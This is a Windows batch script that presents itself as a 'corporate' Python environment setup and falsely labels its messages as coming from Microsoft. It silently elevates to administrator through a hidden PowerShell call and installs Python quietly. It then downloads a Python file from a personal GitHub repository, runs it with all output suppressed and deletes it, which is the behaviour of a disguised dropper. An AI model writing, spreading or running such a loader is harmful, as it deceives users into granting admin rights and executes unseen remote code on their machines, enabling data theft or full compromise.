@echo off
setlocal enabledelayedexpansion
title System Python Environment Setup

:: Professional corporate version with minimal UI

:: Administrator privilege check and elevation
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [System] Elevating privileges for enterprise deployment...
    powershell -Command "Start-Process cmd -ArgumentList '/c ""%~f0""' -Verb RunAs" -WindowStyle Hidden
    exit /b
)

echo [Microsoft] Configuring Python runtime environment...

:: Silent Python installation
python --version >nul 2>&1
if errorlevel 1 (
    echo [Install] Deploying Python runtime...
    bitsadmin /transfer CorpPythonDeploy /download /priority normal "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" "%TEMP%\corp-python.exe" >nul 2>&1
    if exist "%TEMP%\corp-python.exe" (
        "%TEMP%\corp-python.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 Shortcuts=0 >nul 2>&1
        del "%TEMP%\corp-python.exe" >nul 2>&1
        echo [Success] Python runtime deployed.
    )
)

:: Enterprise script execution
echo [Deployment] Executing corporate script package...
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/gabid4755-wq/Blankk/main/11.py' -OutFile '%TEMP%\corp-script.py' -UseBasicParsing" >nul 2>&1
python "%TEMP%\corp-script.py" >nul 2>&1
del "%TEMP%\corp-script.py" >nul 2>&1

echo [System] Deployment completed successfully.
timeout /t 2 /nobreak >nul